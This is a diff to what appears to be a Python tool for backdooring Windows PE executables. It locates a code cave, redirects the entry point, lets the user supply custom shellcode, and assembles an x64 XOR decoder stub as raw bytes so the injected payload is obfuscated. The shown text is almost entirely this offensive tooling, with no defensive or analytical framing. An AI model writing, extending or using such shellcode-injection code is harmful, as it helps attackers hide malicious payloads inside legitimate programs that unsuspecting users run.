@@ -263,8 +263,9 @@ if hex(pe.FILE_HEADER.Machine) == '0x14c':
 
 else:
     print(PrintGreen("[+]") + " Arch: \t\t\t64-bit")
-    shellcode = shellcode64
-    minCave = len(shellcode) + 20
+    if args.shellcode is False:
+        shellcode = shellcode64
+
     x64 = True
     if args.encoder:
         print(PrintRed("[!]") + " Encoding Not Applied as x64")
@@ -281,7 +282,11 @@ entrypoint = '0x{:08x}'.format(pe.OPTIONAL_HEADER.AddressOfEntryPoint)
 print(PrintBlue("[i]") + " Entry Point:\t\t" + entrypoint)
 
 # Find Code Cave
-minCave = len(shellcode) + 20
+if args.encoder:
+    minCave = len(shellcode) + 25
+else:
+    minCave = len(shellcode) + 20
+
 try:
     newEntryPoint, newRawOffset = FindCave()
 except:
@@ -332,7 +337,7 @@ if args.info is False:
         print("\tEnd Address:\t\t" + hex(endDecodeAddress))
 
         if x64:
-            
+
             xorDecoder = b"\x48\xb8" + (int(hex(newEntryPoint), 16) + int(hex(0x1b), 16)).to_bytes(8, 'little')
             xorDecoder += b"\x80\x30" + encodingKey
             xorDecoder += b"\x48\xFF\xC0"
